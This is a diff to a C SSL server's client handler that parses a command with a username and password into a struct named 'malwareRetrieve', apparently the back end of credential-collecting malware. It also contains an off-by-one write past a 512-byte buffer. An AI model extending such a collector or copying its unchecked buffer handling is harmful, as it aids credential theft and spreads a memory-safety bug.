@@ -44,17 +44,18 @@ void *handleClient(void *arg) {
   
   while (1) {
       char buffer[512];
+      memset(buffer, 0, sizeof(buffer));
       int len = SSL_read(client->ssl, buffer, sizeof(buffer));
       if (len <= 0) {
           printLog("[LOG][id: %d - from: %s] Connexion closed or SSL_read failed\n",
                    client->client, client->ip);
-          break;
+          goto cleanup;
       }
 
       buffer[len] = '\0';
       buffer[strcspn(buffer, "\r\n")] = '\0'; 
 
-      printLog("[LOG][id: %d - from: %s] Message received: %s\n",
+      printLog("[LOG][id: %d - from: %s] Message received: %s\n\n",
                client->client, client->ip, buffer);
 
       char *saveTOK;
@@ -63,7 +64,7 @@ void *handleClient(void *arg) {
       if (!clientinput || strncmp(clientinput, API_COMMAND, strlen(API_COMMAND)) != 0) {
           printLog("[LOG][id: %d - from: %s] Invalid or missing command\n",
                    client->client, client->ip);
-          break;
+          continue;
       }
 
       malwareRetrieve current = {0};
@@ -71,7 +72,7 @@ void *handleClient(void *arg) {
       if (!clientinput) {
           printLog("[LOG][id: %d - from: %s] Missing username argument\n",
                    client->client, client->ip);
-          break;
+          continue;
       }
       strncpy(current.username, clientinput, sizeof(current.username) - 1);
 
@@ -79,21 +80,18 @@ void *handleClient(void *arg) {
       if (!clientinput) {
           printLog("[LOG][id: %d - from: %s] Missing password argument\n",
                    client->client, client->ip);
-          break;
+          continue;
       }
       if (strtok_r(NULL, " ", &saveTOK)) {
           printLog("[LOG][id: %d - from: %s] Too many arguments\n",
                    client->client, client->ip);
-          break;
+          continue;
       }
 
       strncpy(current.password, clientinput, sizeof(current.password) - 1);
       strncpy(current.ipaddr, client->ip, sizeof(current.ipaddr) - 1);
 
-      printLog("[LOG][id: %d - from: %s] Authenticated: %s / %s\n",
-               client->client, client->ip, current.username, current.password);
-
-      goto cleanup;
+      continue;
   }
 
 cleanup:
